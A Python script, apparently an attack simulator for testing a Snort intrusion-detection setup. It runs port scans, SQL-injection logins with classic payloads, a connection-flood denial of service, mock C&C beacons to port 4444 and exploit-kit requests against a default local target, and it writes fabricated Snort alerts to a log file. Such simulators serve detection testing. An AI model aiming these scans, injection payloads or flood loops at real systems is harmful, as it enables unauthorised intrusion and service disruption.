import socket
import threading
import time
import random
import requests
from scapy.all import *
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class AttackSimulator:
    def __init__(self, target_ip="127.0.0.1"):
        self.target_ip = target_ip
        self.running = False
        self.attacks = {
            "port_scan": self.port_scan,
            "sql_injection": self.sql_injection,
            "dos": self.dos_attack,
            "malware_cnc": self.malware_cnc,
            "exploit_kit": self.exploit_kit
        }

    def start_attack(self, attack_type, duration=30):
        """Start a specific type of attack"""
        if attack_type not in self.attacks:
            logger.error(f"Unknown attack type: {attack_type}")
            return

        self.running = True
        logger.info(f"Starting {attack_type} attack...")
        
        # Run the attack in a separate thread
        thread = threading.Thread(
            target=self.attacks[attack_type],
            args=(duration,)
        )
        thread.daemon = True
        thread.start()

    def stop_attack(self):
        """Stop all running attacks"""
        self.running = False
        logger.info("Stopping all attacks...")

    def port_scan(self, duration):
        """Simulate a port scan attack"""
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            # Scan common ports
            for port in [21, 22, 23, 25, 53, 80, 443, 3306, 3389]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((self.target_ip, port))
                    if result == 0:
                        logger.info(f"Port {port} is open")
                    sock.close()
                except:
                    pass
                time.sleep(0.1)
            time.sleep(1)

    def sql_injection(self, duration):
        """Simulate SQL injection attempts"""
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            # Common SQL injection payloads
            payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users; --",
                "admin' --",
                "1' OR '1'='1"
            ]
            
            try:
                # Simulate web request with SQL injection
                payload = random.choice(payloads)
                url = f"http://{self.target_ip}/login"
                data = {"username": payload, "password": "test"}
                requests.post(url, data=data, timeout=1)
                logger.info(f"SQL Injection attempt: {payload}")
            except:
                pass
            time.sleep(2)

    def dos_attack(self, duration):
        """Simulate a Denial of Service attack"""
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            try:
                # Create multiple TCP connections
                for _ in range(10):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.target_ip, 80))
                    sock.send(b"GET / HTTP/1.1\r\n" * 100)
                    sock.close()
                logger.info("DoS attack packet sent")
            except:
                pass
            time.sleep(0.5)

    def malware_cnc(self, duration):
        """Simulate malware command and control traffic"""
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            try:
                # Simulate C&C communication
                cnc_ips = [
                    "192.168.1.100",
                    "10.0.0.50",
                    "172.16.0.25"
                ]
                cnc_ip = random.choice(cnc_ips)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((cnc_ip, 4444))
                sock.send(b"HEARTBEAT")
                sock.close()
                logger.info(f"Malware C&C communication to {cnc_ip}")
            except:
                pass
            time.sleep(3)

    def exploit_kit(self, duration):
        """Simulate exploit kit activity"""
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            try:
                # Simulate exploit kit landing page
                url = f"http://{self.target_ip}/exploit"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1"
                }
                requests.get(url, headers=headers, timeout=1)
                logger.info("Exploit kit landing page accessed")
            except:
                pass
            time.sleep(2)

def generate_snort_alert(attack_type, source_ip, dest_ip):
    """Generate a Snort-style alert for the attack"""
    timestamp = datetime.now().strftime("%m/%d-%H:%M:%S.%f")
    
    alerts = {
        "port_scan": f"""[**] [1:1000001:1] Port Scan Detected [**]
[Classification: Attempted Information Leak] [Priority: 2]
{timestamp} {source_ip}:{random.randint(1024,65535)} -> {dest_ip}:80
TCP TTL:128 TOS:0x0 ID:0 IpLen:20 DgmLen:60""",

        "sql_injection": f"""[**] [1:2001219:3] SQL Injection Attempt [**]
[Classification: Web Application Attack] [Priority: 1]
{timestamp} {source_ip}:{random.randint(1024,65535)} -> {dest_ip}:80
TCP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:1200""",

        "dos": f"""[**] [1:2003324:2] Denial of Service Attack [**]
[Classification: Attempted Denial of Service] [Priority: 1]
{timestamp} {source_ip}:{random.randint(1024,65535)} -> {dest_ip}:80
TCP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:2500""",

        "malware_cnc": f"""[**] [1:2000345:2] MALWARE-CNC Known malicious command and control traffic [**]
[Classification: Malware Command and Control] [Priority: 1]
{timestamp} {source_ip}:{random.randint(1024,65535)} -> {dest_ip}:4444
TCP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:1800""",

        "exploit_kit": f"""[**] [1:2003324:2] EXPLOIT-KIT Multiple exploit kit landing page detection [**]
[Classification: Malware Command and Control] [Priority: 1]
{timestamp} {source_ip}:{random.randint(1024,65535)} -> {dest_ip}:80
TCP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:2500"""
    }
    
    return alerts.get(attack_type, "")

def write_alert_to_file(alert, filename="C:\\Snort\\log\\alert.txt"):
    """Write the alert to Snort's alert file"""
    try:
        with open(filename, "a") as f:
            f.write(alert + "\n\n")
    except Exception as e:
        logger.error(f"Error writing alert to file: {e}")

if __name__ == "__main__":
    # Create simulator instance
    simulator = AttackSimulator()
    
    # Example: Run different attacks
    print("Starting attack simulation...")
    print("1. Port Scan")
    print("2. SQL Injection")
    print("3. DoS Attack")
    print("4. Malware C&C")
    print("5. Exploit Kit")
    print("6. Exit")
    
    while True:
        choice = input("Select attack type (1-6): ")
        
        if choice == "6":
            break
            
        attack_types = {
            "1": "port_scan",
            "2": "sql_injection",
            "3": "dos",
            "4": "malware_cnc",
            "5": "exploit_kit"
        }
        
        if choice in attack_types:
            attack_type = attack_types[choice]
            simulator.start_attack(attack_type)
            
            # Generate and write alerts
            for _ in range(5):  # Generate 5 alerts for each attack
                alert = generate_snort_alert(
                    attack_type,
                    f"192.168.1.{random.randint(2,254)}",
                    "10.0.0.1"
                )
                write_alert_to_file(alert)
                time.sleep(1)
            
            time.sleep(5)  # Wait for attack to complete
            simulator.stop_attack()
        else:
            print("Invalid choice!") 